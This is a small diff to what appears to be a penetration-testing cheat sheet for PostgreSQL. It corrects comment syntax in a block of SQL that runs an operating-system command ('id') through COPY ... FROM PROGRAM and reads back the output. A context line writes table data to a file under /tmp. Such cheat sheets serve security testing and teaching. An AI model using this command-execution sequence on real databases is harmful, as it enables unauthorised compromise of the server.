@@ -150,9 +150,9 @@ COPY pentestlab(t) TO '/tmp/pentestlab';
 Can be used from Metasploit if you have a direct access to the database, otherwise you need to execute manually the following SQL queries.
 
 ```
-DROP TABLE IF EXISTS cmd_exec;          > -- [Optional] Drop the table you want to use if it already exists
-CREATE TABLE cmd_exec(cmd_output text); //-- Create the table you want to hold the command output
-COPY cmd_exec FROM PROGRAM 'id';        //-- Run the system command via the COPY FROM PROGRAM function
-SELECT * FROM cmd_exec;                 //-- [Optional] View the results
-DROP TABLE IF EXISTS cmd_exec;          //-- [Optional] Remove the table
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
+CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
+COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
+SELECT * FROM cmd_exec;                 -- [Optional] View the results
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
 ```
